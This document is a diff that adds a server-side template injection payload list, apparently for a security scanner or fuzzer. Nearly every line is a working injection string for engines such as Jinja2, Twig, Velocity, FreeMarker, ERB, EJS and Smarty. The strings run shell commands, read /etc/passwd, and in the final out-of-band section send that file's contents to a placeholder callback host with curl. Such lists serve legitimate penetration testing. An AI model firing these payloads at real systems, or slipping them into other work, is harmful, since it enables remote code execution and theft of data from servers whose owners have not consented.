@@ -1,0 +1,62 @@
+# Generic SSTI advanced payloads
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+#{7*7}
+*{7*7}
+{{7*'7'}}
+${"freemarker.template.utility.Execute"?new()("id")}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{% if 1==1 %}SSTI_CONFIRMED{% endif %}
+<#if 1==1>SSTI_CONFIRMED</#if>
+#if(1==1)SSTI_CONFIRMED#end
+{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
+{{['id']|map('system')|join}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{app.request.server.all()}}
+{{ ''.__class__.__base__.__subclasses__() }}
+{{ readFile('/etc/passwd') }}
+# URL-encoded SSTI probe
+%7b%7b7*7%7d%7d
+%24%7b7*7%7d
+%3c%25%3d+7*7+%25%3e
+%23%7b7*7%7d
+# Double URL-encoded
+%257b%257b7*7%257d%257d
+%2524%257b7*7%257d
+# Unicode braces
+# HTML entity encoded
+&#123;&#123;7*7&#125;&#125;
+# Jinja2 specific
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+# Twig specific
+{{['cat /etc/passwd']|map('system')}}
+{{'id'|filter('system')}}
+# Velocity specific
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()
+# FreeMarker specific
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex('id')}
+# ERB Ruby
+<%= system('id') %>
+# Spring Expression Language
+#{T(java.lang.Runtime).getRuntime().exec('id')}
+# EJS Node.js
+<%= require('child_process').execSync('id').toString() %>
+# Nunjucks
+{{range.constructor("return require('child_process').execSync('id').toString()")()}}
+# Smarty PHP
+{php}system('id');{/php}
+{fetch file='/etc/passwd'}
+# Mako
+<%!import os%>${os.popen('id').read()}
+# Handlebars
+{{constructor.constructor "alert(1)" this}}
+# Pebble Java
+{% set x = 'class'.getClass() %}{{x}}
+# SSTI OOB DNS
+{{''.__class__.__mro__[1].__subclasses__()[40]('curl http://INTERACTSH_URL/?c='+open('/etc/passwd').read(),shell=True,stdout=-1).communicate()}}
+${T(java.net.URL).new('http://INTERACTSH_URL/').openStream()}
